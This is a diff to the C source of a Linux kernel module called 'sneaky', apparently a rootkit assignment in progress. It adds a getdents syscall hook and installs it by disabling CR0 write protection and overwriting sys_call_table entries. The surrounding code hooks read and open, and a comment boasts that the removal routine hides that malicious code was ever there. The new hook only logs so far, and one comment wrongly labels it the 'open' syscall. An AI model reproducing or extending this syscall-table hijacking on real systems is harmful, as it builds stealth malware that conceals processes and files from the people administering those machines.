@@ -11,6 +11,14 @@
 
 #include <linux/moduleparam.h>
 
+#define BUFFLEN 1024
+struct linux_dirent {
+ u64 d_ino;
+ s64 d_off;
+ unsigned short d_reclen;
+ char d_name[BUFFLEN];
+};
+
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -73,6 +81,21 @@ asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
 ////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////
 
+asmlinkage int (*original_call_getdents)(unsigned int fd, struct linux_dirent *dirp,
+                    unsigned int count);
+
+//Define our new sneaky version of the 'open' syscall
+asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
+                    unsigned int count)
+{
+  printk(KERN_INFO "Getdents: Very, very Sneaky!\n");
+  return original_call_getdents(fd,dirp,count);
+}
+
+////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////
+
 static int sneaky_process_pid=-1;
 module_param(sneaky_process_pid, int, 0);
 MODULE_PARM_DESC(sneaky_process_pid, "Process ID of Sneaky Process");
@@ -105,6 +128,9 @@ static int initialize_sneaky_module(void)
   original_call_read = (void*)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
+  original_call_getdents = (void*)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -132,8 +158,8 @@ static void exit_sneaky_module(void)
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call_open;
-
   *(sys_call_table + __NR_read) = (unsigned long)original_call_read;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_call_getdents;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
